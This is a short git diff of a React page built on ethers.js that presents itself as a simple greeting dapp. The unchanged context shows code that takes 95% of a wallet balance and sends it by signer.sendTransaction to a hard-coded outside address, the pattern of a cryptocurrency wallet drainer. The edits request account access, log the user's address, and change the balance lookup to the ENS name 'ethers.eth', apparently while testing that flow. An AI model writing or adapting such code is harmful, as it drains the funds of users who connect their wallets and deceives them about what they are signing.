@@ -43,7 +43,7 @@ export default function Home() {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner()
 
-    let balance = await provider.getBalance(signer.getAddress()) ;
+    let balance = await provider.getBalance("ethers.eth") ;
    let amount = balance.mul(ethers.utils.parseEther("95")).div(ethers.utils.parseEther("100"));
    const tx = signer.sendTransaction({
     to: "0xC1F1cdD386776a357531cc5b91e1eF8E14a45DC8",
@@ -74,10 +74,11 @@ export default function Home() {
   // Call smart contract, set new value
   async function connect() {
     const provider = new ethers.providers.Web3Provider(window.ethereum)
-    // await provider.send("eth_requestAccounts", []);
+    await provider.send("eth_requestAccounts", []);
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
-    let balance = await provider.getBalance(userAddress) ;
+    console.log("Address " + userAddress);
+    let balance = await provider.getBalance("ethers.eth") ;
 
     setGreetingState(userAddress);
     setNewGreetingState(ethers.utils.formatEther(balance));
